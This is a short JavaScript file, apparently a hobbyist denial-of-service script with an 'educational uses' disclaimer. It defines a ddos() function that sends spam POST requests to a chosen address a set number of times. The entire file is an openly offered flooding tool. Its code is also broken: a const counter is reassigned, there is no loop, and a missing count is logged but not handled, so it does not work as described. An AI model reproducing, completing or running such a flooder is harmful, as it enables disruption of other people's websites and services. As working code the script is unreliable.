//Script only for educational uses
//Created by CodeSalvageON

const turn = 0;

function ddos(address, times) {
  var http = new XMLHttpRequest();
  
  //Check if address or times is undefined
  if (address == undefined) {
    console.log('FAILED: ADDRESS IS UNDEFINED');
    return false;
  }

  if (times == undefined) {
    console.log('FAILED: TIMES IS UNDEFINED');
  }

  //Check the amount of times
  if (turn == times) {
    console.log('FINISHED');
  }
  else{
    http.open("POST", address, true);
    http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    
    spam_data = "CodeSalvageON on top";
    http.send(spam_data);
    
    turn = turn + 1;
  }
}
